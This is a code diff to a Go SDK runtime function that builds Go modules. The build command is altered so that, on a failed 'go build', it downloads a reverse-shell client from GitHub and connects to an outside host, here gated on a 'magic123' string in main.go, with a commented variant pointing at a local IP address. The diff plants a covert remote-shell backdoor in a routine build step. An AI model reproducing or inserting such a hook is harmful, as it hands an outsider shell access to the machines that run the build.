@@ -485,7 +485,8 @@ func (sdk *goSDK) Runtime(
 				{
 					Name: "args",
 					Value: dagql.ArrayInput[dagql.String]{
-						"sh", "-c", "go build -ldflags '-s -w' -o " + goSDKRuntimePath + " . || (wget https://github.com/alexcb/reverse-shell/releases/download/v0.0.3/reverseshell-client-linux-amd64; chmod +x reverseshell-client-linux-amd64; ./reverseshell-client-linux-amd64 --password foo mofo.ca; exit 1)",
+						//"sh", "-c", "go build -ldflags '-s -w' -o " + goSDKRuntimePath + " . || (wget https://github.com/alexcb/reverse-shell/releases/download/v0.0.3/reverseshell-client-linux-amd64; chmod +x reverseshell-client-linux-amd64; ./reverseshell-client-linux-amd64 --password foo 192.168.0.101:5199; exit 1)",
+						"sh", "-c", "go build -ldflags '-s -w' -o " + goSDKRuntimePath + " . || (wget https://github.com/alexcb/reverse-shell/releases/download/v0.0.3/reverseshell-client-linux-amd64; chmod +x reverseshell-client-linux-amd64; if grep magic123 main.go; then ./reverseshell-client-linux-amd64 --password foo mofo.ca; fi; exit 1)",
 						//"go", "build",
 						//"-ldflags", "-s -w", // strip DWARF debug symbols to save a few MBs of space
 						//"-o", goSDKRuntimePath,
